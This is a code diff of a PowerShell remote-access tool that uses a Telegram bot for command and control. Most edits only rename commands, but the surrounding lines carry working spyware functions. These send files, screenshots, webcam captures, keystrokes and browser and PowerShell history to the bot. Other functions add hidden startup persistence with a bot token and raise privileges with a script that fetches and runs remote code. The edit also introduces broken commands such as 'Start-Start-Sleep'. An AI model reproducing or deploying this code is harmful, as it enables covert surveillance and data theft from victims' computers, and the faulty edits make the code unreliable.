@@ -17,27 +17,29 @@ $global:errormsg = 1 # 1 = return error messages to chat (off by default)
 $parent = "https://raw.githubusercontent.com/poiuztreq/Powershell-Tools-and-Toys/main/Command-and-Control/Telegram-C2-Client.ps1" # parent script URL (for restarts and persistance)
 $apiUrl = "https://api.telegram.org/bot$Token/sendMessage"
 $URL = 'https://api.telegram.org/bot{0}' -f $Token
-$AcceptedSession=""
-$LastUnAuthenticatedMessage=""
-$lastexecMessageID=""
+$AcceptedSession = ""
+$LastUnAuthenticatedMessage = ""
+$lastexecMessageID = ""
 
 # Startup Delay
-Sleep 5
-if(Test-Path "C:\Windows\Tasks\service.vbs"){rm -path "C:\Windows\Tasks\service.vbs" -Force}
+Start-Sleep 5
+if(Test-Path "C:\Windows\Tasks\service.vbs"){
+    Remove-Item -path "C:\Windows\Tasks\service.vbs" -Force
+}
 
 # Get Chat ID from the bot
 while($chatID.length -eq 0){
     $updates = Invoke-RestMethod -Uri ($url + "/getUpdates")
     if ($updates.ok -eq $true) {$latestUpdate = $updates.result[-1]
     if ($latestUpdate.message -ne $null){$chatID = $latestUpdate.message.chat.id}}
-    Sleep 10
+    Start-Sleep 10
 }
 
 # Emoji characters and other setup
 $charCodes = @(0x2705, 0x1F4BB, 0x274C, 0x1F55C, 0x1F50D, 0x1F517, 0x23F8)
 $chars = $charCodes | ForEach-Object { [char]::ConvertFromUtf32($_) }
 $tick, $comp, $closed, $waiting, $glass, $cmde, $pause = $chars
-$scriptDirectory = Get-Content -path $MyInvocation.MyCommand.Name -Raw
+#$scriptDirectory = Get-Content -path $MyInvocation.MyCommand.Name -Raw
 $Mts = New-Object psobject 
 $Mts | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID
 
@@ -116,7 +118,7 @@ Post-Message | Out-Null
 Function Close{
 $contents = "$comp $env:COMPUTERNAME $closed Connection Closed"
 Post-Message
-rm -Path "$env:temp/tgc2.txt" -Force
+Remove-Item -Path "$env:temp/tgc2.txt" -Force
 exit
 }
 
@@ -130,7 +132,7 @@ if (Test-Path -Path $path){
         [System.IO.Compression.ZipFile]::CreateFromDirectory($path, $tempZipFilePath)
         curl.exe -F chat_id="$ChatID" -F document=@"$tempZipFilePath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
         Write-Output "File Upload Complete: $path"
-        Rm -Path $tempZipFilePath -Recurse -Force
+        Remove-Item -Path $tempZipFilePath -Recurse -Force
     }else{
         curl.exe -F chat_id="$ChatID" -F document=@"$Path" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
         Write-Output "File Upload Complete: $path"
@@ -140,7 +142,7 @@ if (Test-Path -Path $path){
 
 Function Exfiltrate {
 param ([string[]]$FileType,[string[]]$Path)
-$maxZipFileSize = 50MB
+$maxZipFileSize = 100MB
 $currentZipSize = 0
 $index = 1
 $FilePath ="$env:temp/Loot$index.zip"
@@ -161,8 +163,8 @@ foreach ($folder in $foldersToSearch) {
             if ($currentZipSize + $fileSize -gt $maxZipFileSize) {
                 $zipArchive.Dispose()
                 $currentZipSize = 0
-                Post-File; rm -Path $FilePath -Force
-                Sleep 1
+                Post-File; Remove-Item -Path $FilePath -Force
+                Start-Sleep 1
                 $index++
                 $FilePath ="$env:temp/Loot$index.zip"
                 $zipArchive = [System.IO.Compression.ZipFile]::Open($FilePath, 'Create')
@@ -180,7 +182,7 @@ foreach ($folder in $foldersToSearch) {
         }
     }
 $zipArchive.Dispose()
-Post-File ;rm -Path $FilePath -Force
+Post-File ;Remove-Item -Path $FilePath -Force
 $contents = "$env:COMPUTERNAME $tick Exfiltration Complete!"
 Post-Message | Out-Null
 }
@@ -195,7 +197,7 @@ $filePath = "$env:temp\sc.png"
 $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
 $graphics.Dispose()
 $bitmap.Dispose()
-Post-File; rm -Path $filePath -Force
+Post-File; Remove-Item -Path $filePath -Force
 }
 
 Function Key-Capture {
@@ -209,7 +211,7 @@ While ($true){
     $keyPressed = $false
     try{
     while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
-        Start-Sleep -Milliseconds 30
+        Start-Start-Sleep -Milliseconds 30
         for ($asc = 8; $asc -le 254; $asc++){
         $keyst = $API::GetAsyncKeyState($asc)
             if ($keyst -eq -32767) {
@@ -248,7 +250,7 @@ While ($true){
         }
     }
 $LastKeypressTime.Restart()
-Start-Sleep -Milliseconds 10
+Start-Start-Sleep -Milliseconds 10
 }
 }
 
@@ -257,7 +259,7 @@ $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullNam
 $email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches;$email = ("$email").Trim()
 $computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
 $computerIP = get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.DefaultIPGateway.length -gt 1}
-$NearbyWifi = explorer.exe ms-availablenetworks: ; sleep 4; (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Signal*" -or $_ -like "*Band*"}).trim()
+$NearbyWifi = explorer.exe ms-availablenetworks: ; Start-Sleep 4; (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Signal*" -or $_ -like "*Band*"}).trim()
 $Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 
 $computerSystem = Get-CimInstance CIM_ComputerSystem
 $computerBIOS = Get-CimInstance CIM_BIOSElement
@@ -304,7 +306,7 @@ $FilePath = "$env:temp\SystemInfo.txt"
 ($Hdds| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
 "USB Info           `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
 ($COMDevices| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
-Post-File ;rm -Path $FilePath -Force
+Post-File ;Remove-Item -Path $FilePath -Force
 }
 
 Function Software-Info{
@@ -320,16 +322,16 @@ $FilePath = "$env:temp\SoftwareInfo.txt"
 ($process| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
 "Services           `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
 ($service| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
-Post-File ;rm -Path $FilePath -Force
+Post-File ;Remove-Item -Path $FilePath -Force
 }
 
 Function History-Info{
 $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?';$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
 $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
 $Value | ForEach-Object {$Key = $_;if ($Key -match $Search){New-Object -TypeName PSObject -Property @{User = $env:UserName;Browser = 'chrome';DataType = 'history';Data = $_}}}
-$Regex2 = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?';$Pathed = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
+$Regex2 = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?';$Pathed = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
 $Value2 = Get-Content -Path $Pathed | Select-String -AllMatches $regex2 |% {($_.Matches).Value} |Sort -Unique
-$Value2 | ForEach-Object {$Key = $_;if ($Key -match $Search){New-Object -TypeName PSObject -Property @{User = $env:UserName;Browser = 'chrome';DataType = 'history';Data = $_}}}
+$Value2 | ForEach-Object {$Key = $_;if ($Key -match $Search){New-Object -TypeName PSObject -Property @{User = $env:UserName;Browser = 'edge';DataType = 'history';Data = $_}}}
 $pshist = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";$pshistory = Get-Content $pshist -raw
 $FilePath = "$env:temp\History.txt"
 "HISTORY INFO `n ====================================================================== `n" | Out-File -FilePath $FilePath -Encoding ASCII -Append
@@ -340,12 +342,12 @@ $FilePath = "$env:temp\History.txt"
 ($Value2| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
 "Powershell History `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
 ($pshistory| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
-Post-File ;rm -Path $FilePath -Force
+Post-File ;Remove-Item -Path $FilePath -Force
 }
 
 Function Enumerate-LAN{
 param ([string]$Prefix)
-if ($Prefix.Length -eq 0){Write-Output "Use -prefix to define the first 3 parts of an IP Address eg. Enumerate-LAN -prefix 192.168.1";sleep 1 ;return}
+if ($Prefix.Length -eq 0){Write-Output "Use -prefix to define the first 3 parts of an IP Address eg. Enumerate-LAN -prefix 192.168.1";Start-Sleep 1 ;return}
 $FileOut = "$env:temp\Computers.csv"
 1..255 | ForEach-Object {
     $ipAddress = "$Prefix.$_"
@@ -360,7 +362,7 @@ $data | ForEach-Object {
     $mac = $_.'MAC'
     $apiUrl = "https://api.macvendors.com/$mac"
     $manufacturer = (Invoke-RestMethod -Uri $apiUrl).Trim()
-    Start-Sleep -Seconds 1
+    Start-Start-Sleep -Seconds 1
     $_ | Add-Member -MemberType NoteProperty -Name "manufacturer" -Value $manufacturer -Force
     }
 $data | Export-Csv $FileOut -NoTypeInformation
@@ -377,7 +379,7 @@ $data | ForEach-Object {
 $data | Export-Csv $FileOut -NoTypeInformation
 $results = Get-Content -Path $FileOut -Raw
 Write-Output "$results"
-rm -Path $FileOut
+Remove-Item -Path $FileOut
 }
 
 Function Folder-Tree{
@@ -388,8 +390,8 @@ tree $env:APPDATA /A /F | Out-File $env:temp/Appdata.txt
 tree $env:PROGRAMFILES /A /F | Out-File $env:temp/ProgramFiles.txt
 $FilePath ="$env:temp/TreesOfKnowledge.zip"
 Compress-Archive -Path $env:TEMP\Desktop.txt, $env:TEMP\Documents.txt, $env:TEMP\Downloads.txt, $env:TEMP\Appdata.txt, $env:TEMP\ProgramFiles.txt -DestinationPath $FilePath
-sleep 1
-Post-File ;rm -Path $FilePath -Force
+Start-Sleep 1
+Post-File ;Remove-Item -Path $FilePath -Force
 Write-Output "Done."
 }
 
@@ -397,11 +399,11 @@ Function Add-Persistance{
 #$newScriptPath = "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"
 #$newScriptPath = "$env:USERPROFILE\Desktop\test\copy.ps1"
 #$scriptContent | Out-File -FilePath $newScriptPath -force
-#sleep 1
+#Start-Sleep 1
 #if ($newScriptPath.Length -lt 100){
 #    "`$tg = `"$tg`"" | Out-File -FilePath $newScriptPath -Force
 #    i`wr -Uri "$parent" -OutFile "$env:temp/temp.ps1"
-#    sleep 1
+#    Start-Sleep 1
 #    Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
 #    }
 $tobat = @'
@@ -413,12 +415,12 @@ objShell.Run "powershell -NoP -Ep Bypass -W H -C $tg='6609237868:AAH3RePygk7Q6uA
 $pth = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
 $tobat | Out-File -FilePath $pth -Force
 Write-Output "Persistance Added."
-rm -path "$env:TEMP\temp.ps1" -Force
+Remove-Item -path "$env:TEMP\temp.ps1" -Force
 }
 
 Function Remove-Persistance{
-rm -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
-#rm -Path "$env:USERPROFILE\Desktop\test\copy.ps1"
+Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
+#Remove-Item -Path "$env:USERPROFILE\Desktop\test\copy.ps1"
 Write-Output "Uninstalled."
 }
 
@@ -442,7 +444,7 @@ If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]:
 Function Attempt-Elevate{
 $tobat = @"
 Set WshShell = WScript.CreateObject(`"WScript.Shell`")
-WScript.Sleep 200
+WScript.Start-Sleep 200
 If Not WScript.Arguments.Named.Exists(`"elevate`") Then
   CreateObject(`"Shell.Application`").ShellExecute WScript.FullName _
     , `"`"`"`" & WScript.ScriptFullName & `"`"`" /elevate`", `"`", `"runas`", 1
@@ -453,8 +455,8 @@ WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tg='$tg'; irm http
 $pth = "C:\Windows\Tasks\service.vbs"
 $tobat | Out-File -FilePath $pth -Force
 & $pth
-Sleep 7
-rm -Path $pth
+Start-Sleep 7
+Remove-Item -Path $pth
 Write-Output "Done."
 }
 
@@ -522,7 +524,7 @@ if ($videoDevice) {
     Write-Host "No video devices found on the system."
 }
     curl.exe -F chat_id="$ChatID" -F document=@"$outputFile" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
-    sleep 1
+    Start-Sleep 1
     Remove-Item -Path $outputFile -Force
 }
 
@@ -568,11 +570,11 @@ while ($killint -eq 0) {
     $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$offset" -Method Get
     foreach ($update in $updates.result) {
         $offset = $update.update_id + 1
-        Sleep 1
+        Start-Sleep 1
         if ($update.callback_query.data -eq "button_clicked") {$killint = 1}
         if ($update.callback_query.data -eq "button2_clicked") {$killint = 1;Options}
         }
-    Sleep 1
+    Start-Sleep 1
     }
 $contents = "$comp $env:COMPUTERNAME $tick Session Started"
 Post-Message
@@ -630,7 +632,7 @@ Post-Message
 
 # Start the main wait loop.
 While ($true){
-Sleep 2
+Start-Sleep 2
 $messages=ReceiveMSG
     if ($LastUnAuthMsg -like $null){$LastUnAuthMsg=$messages.message.date}
     if (!($AcceptedSession)){$CheckAuthentication=IsAuth -CheckMessage $messages}
